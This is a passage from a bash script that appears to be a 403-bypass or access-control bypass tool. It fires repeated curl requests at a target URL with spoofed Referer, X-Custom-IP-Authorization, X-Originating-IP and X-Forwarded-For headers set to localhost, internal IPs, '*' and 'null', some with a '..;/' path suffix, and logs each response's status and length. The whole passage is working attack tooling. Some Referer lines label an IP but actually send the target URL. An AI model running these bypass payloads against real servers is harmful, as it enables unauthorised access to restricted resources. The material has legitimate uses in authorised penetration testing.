	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Referer Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Custom-IP-Authorization Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: ${website_ip}" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: ${website_ip}' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: *" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: *' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 8.8.8.8" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 8.8.8.8' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: null" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: null' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 192.168.0.2" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 192.168.0.2' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 10.0.0.1" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 10.0.0.1' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 0.0.0.0" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 0.0.0.0' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: localhost" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: localhost' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 192.168.1.1" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 192.168.1.1' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Originating-IP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Originating-IP Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Originating-IP: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Forwarded-For Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: 8.8.8.8"
